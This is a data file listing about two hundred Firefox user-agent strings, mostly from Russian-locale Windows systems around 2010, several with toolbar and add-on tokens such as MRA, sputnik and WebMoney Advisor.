Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02812) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.0.5;MEGAUPLOAD 1.0 ( .NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03399) Firefox/3.6.8 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03278) Firefox/3.6.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03278) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) AskTbCLM/3.9.1.14019 Firefox/3.6.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03270) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) AskTbBCPA/3.9.1.14019 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.7 (build 03672) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.5 (build 02842) AskTbSTK/3.8.0.12304 Firefox/3.5.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 GTB7.1 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.4 (build 02647) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03755) Firefox/3.6.11 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 sputnik 2.2.0.34 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 AskTbDVSV5/3.9.1.14019 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.14) Gecko/20101001 Firefox/3.5.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03658) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.14) Gecko/20101001 Firefox/3.5.14 sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.6 (build 03402) Firefox/2.0.0.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.14) Gecko/20101001 Firefox/3.5.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.11) Gecko/20101012 MRA 5.4 (build 02652) Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03399) Firefox/3.6.11 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03385) Firefox/3.6.10 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.6 (build 03402) Firefox/3.5.14 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) AskTbCS2/3.9.1.14019 Firefox/3.6.11 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Ant.com Toolbar 2.0 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03270) Firefox/3.6.3 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03686) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.6 (build 03278) AskTbPTV/3.9.1.14019 Firefox/3.6.9 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.3 (build 02564) Firefox/3.6.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.3 (build 02564) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 GTB7.1 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03270) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02842) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.5 (build 02743) Firefox/3.5.15 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03686) Firefox/3.6.3 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.3 (build 02564) Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) BTRS19009 Firefox/3.6.12 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.4 (build 02647) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03399) Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbSPC2/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.14) Gecko/20101001 MRA 5.6 (build 03278) Firefox/3.5.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.7 (build 03658) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 GTB7.1 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.12) Gecko/20101027 Ubuntu/9.10 (karmic) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.5 (build 02842) Firefox/3.5.11 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03755) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.4 (build 02647) Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV2/3.8.0.12304 Firefox/3.6.12 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03270) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV/3.9.1.14019 Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 (C0063D88-CFC9-A332-6457-58237397485C) MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02743) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbTRL/3.9.1.14019 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.5.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.4 (build 02647) Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03686) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbDVSV5/3.9.1.14019 Firefox/3.6.12 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV2/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) AskTbSPC2/3.9.1.14019 Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc13 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc13 AlexaToolbar/alxf-1.54 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03649) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02645) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.5.15 sputnik 2.3.0.96
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.8) Gecko/2009033100 Ubuntu/9.04 (jaunty) Firefox/3.0.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) AskTbPTV/3.9.1.14019 Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03396) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03399) Firefox/3.6 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.7 (build 03773) Firefox/3.6.11 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03773) Firefox/3.6.9 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03773) Firefox/3.6.12 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03773) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03686) Firefox/3.6.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 Glubble/2.1.0.1 ( .NET CLR 3.5.30729) sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.7 (build 03658) Firefox/3.5 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101027 Linux Mint/10 (Julia) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03402) AskTbCLM/3.9.1.14019 Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.97
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.4 (build 02647) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbSPC2/3.9.1.14019 Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 sputnik unknown
